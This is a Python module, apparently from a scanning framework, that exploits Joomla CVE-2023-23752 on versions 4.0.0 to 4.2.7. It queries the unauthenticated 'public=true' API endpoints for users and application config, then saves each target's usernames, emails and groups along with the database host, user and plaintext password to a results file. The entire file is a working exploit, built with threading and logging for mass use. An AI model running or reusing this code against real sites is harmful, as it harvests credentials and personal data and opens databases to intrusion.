# cython: language_level=3


# https://github.com/Acceis/exploit-CVE-2023-23752?tab=readme-ov-file
# Work on (4.0.0 <= Joomla <= 4.2.7).


import threading
import json

import urllib3
from config.params import ConfigConst
import src.utils.generics.generic as UtilsGenerics

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class JoomlaCveDBUnder428:
    def __init__(self) -> None:
        self.PATH_RESULT_JOOMLA = ConfigConst.CommonPathConfig.RESULT_JOOMLA
        self.file_lock = threading.Lock()
        self.logger_vuln = UtilsGenerics.setup_logging(
            logger_name=f"{ConfigConst.LoggingConfig.LOGGER_VULN_NAME}",
            log_file=ConfigConst.LoggingConfig.VULN_LOG_FILE_PATH,
        )

    def run(self, url, sessions):
        try:
            users = self.parse_users(url, sessions)
            c = self.parse_config(url, sessions)
            if users and c:
                users_to_push = ""
                db_info_to_push = ""
                for u in users:
                    users_to_push += f"Users -> [{u['id']}] {u['name']} ({u['username']}) / {u['email']} / {u['groups']}\n"
                db_info_to_push += f"Site infos -> Name: {c['sitename']} / Editor: {c['editor']} / Captcha: {c['captcha']} / Access: {c['access']} / Debug status: {c['debug']}\nDatabase infos -> DB type: {c['dbtype']} / DB host: {c['host']} / DB user: {c['user']} / DB password: {c['password']} / DB name: {c['db']} / DB prefix: {c['dbprefix']} / DB encryption {c['dbencryption']}\n"
                UtilsGenerics.push_result(
                    self,
                    self.PATH_RESULT_JOOMLA,
                    f"URL : {url}\n{users_to_push}{db_info_to_push}",
                )
                return True
            else:
                return False
        except Exception as e:
            self.logger_vuln.error(
                f"JoomlaCveDBUnder428 / error occured with url : : {url} / {e}"
            )
            return False

    def fetch_users(self, root_url, sessions):
        vuln_url = f"{root_url}/api/index.php/v1/users?public=true"
        try:
            response = sessions.get(vuln_url, timeout=10, verify=False)
            if (
                response.status_code == 200
                and "application/vnd.api+json" in response.headers["Content-Type"]
            ):
                return response.text
            return None
        except Exception:
            return None

    def fetch_config(self, root_url, sessions):
        vuln_url = f"{root_url}/api/index.php/v1/config/application?public=true"
        try:
            response = sessions.get(vuln_url, timeout=10, verify=False)
            if (
                response.status_code == 200
                and "application/vnd.api+json" in response.headers["Content-Type"]
            ):
                return response.text
        except Exception:
            return None

    def parse_users(self, root_url, sessions):
        data_json = self.fetch_users(root_url, sessions)
        if not isinstance(data_json, str):
            return False
        try:
            data = json.loads(data_json).get("data")
        except json.JSONDecodeError:
            return False
        if not data:
            return False
        users = []
        for user in data:
            if user["type"] == "users":
                id = user["attributes"]["id"]
                name = user["attributes"]["name"]
                username = user["attributes"]["username"]
                email = user["attributes"]["email"]
                groups = user["attributes"]["group_names"]
                users.append(
                    {
                        "id": id,
                        "name": name,
                        "username": username,
                        "email": email,
                        "groups": groups,
                    }
                )
        return users

    def parse_config(self, root_url, sessions):
        data_json = self.fetch_config(root_url, sessions)
        if not isinstance(data_json, str):
            return False
        try:
            data_json = json.loads(data_json)
            data = data_json.get("data")
            if not data:
                return False
        except json.JSONDecodeError:
            return False

        config = {}
        for entry in data:
            if entry["type"] == "application":
                for key, value in entry["attributes"].items():
                    config[key] = value
        return config
